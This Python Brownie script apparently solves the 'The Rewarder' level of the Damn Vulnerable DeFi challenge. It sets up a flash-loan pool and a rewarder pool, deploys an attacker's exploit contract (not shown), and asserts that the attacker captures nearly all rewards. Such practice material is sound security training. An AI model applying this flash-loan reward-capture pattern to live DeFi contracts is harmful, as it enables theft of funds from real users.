from brownie import DamnValuableToken, FlashLoanerPool, AccountingToken, TheRewarderPool, RewardToken, therewarder_Exploit, accounts, chain, Wei


TOKENS_IN_LENDER_POOL = Wei("1000000 ether")


def deploy():
    deployer, alice, bob, charlie, david, attacker = accounts[:6]
    users = [alice, bob, charlie, david]

    liquidityToken = DamnValuableToken.deploy({'from': deployer})
    flash_pool = FlashLoanerPool.deploy(
        liquidityToken, {'from': deployer})

    liquidityToken.transfer(
        flash_pool, TOKENS_IN_LENDER_POOL, {'from': deployer})

    rewarderPool = TheRewarderPool.deploy(liquidityToken, {'from': deployer})
    rewardToken = RewardToken.at(rewarderPool.rewardToken())
    accountingToken = AccountingToken.at(rewarderPool.accToken())

    amount = Wei("100 ether")
    for i in users:
        liquidityToken.transfer(i, amount, {'from': deployer})
        liquidityToken.approve(rewarderPool, amount, {'from': i})
        rewarderPool.deposit(amount, {'from': i})
        assert accountingToken.balanceOf(i) == amount

    assert accountingToken.totalSupply() == Wei("400 ether")
    assert rewardToken.totalSupply() == 0

    chain.sleep(60 * 60 * 24 * 5)

    for i in users:
        rewarderPool.distributeRewards({'from': i})
        assert rewardToken.balanceOf(i) == Wei("25 ether")

    assert rewardToken.totalSupply() == Wei("100 ether")
    assert liquidityToken.balanceOf(attacker) == 0
    assert rewarderPool.roundNumber() == 2

    return deployer, attacker, users, liquidityToken, flash_pool, rewarderPool, rewardToken, accountingToken


def exploit(attacker, liquidityToken, flash_pool, rewarderPool, rewardToken):
    chain.sleep(60 * 60 * 24 * 5)
    exploit = therewarder_Exploit.deploy(
        rewarderPool, flash_pool, liquidityToken, rewardToken, {'from': attacker})
    exploit.exploit({'from': attacker})


def after(attacker, users, rewarderPool, rewardToken, liquidityToken):
    assert rewarderPool.roundNumber() == 3

    for i in users:
        rewarderPool.distributeRewards({'from': i})
        rewards = rewardToken.balanceOf(i)

        delta = rewards - Wei("25 ether")
        assert delta < Wei("0.01 ether")

    assert rewardToken.totalSupply() > Wei("100 ether")
    rewards = rewardToken.balanceOf(attacker)

    delta = Wei("100 ether") - rewards
    assert delta < Wei("0.1 ether")

    assert liquidityToken.balanceOf(attacker) == 0


def main():
    deployer, attacker, users, liquidityToken, flash_pool, rewarderPool, rewardToken, accountingToken = deploy()

    exploit(attacker, liquidityToken, flash_pool, rewarderPool, rewardToken)

    after(attacker, users, rewarderPool, rewardToken, liquidityToken)
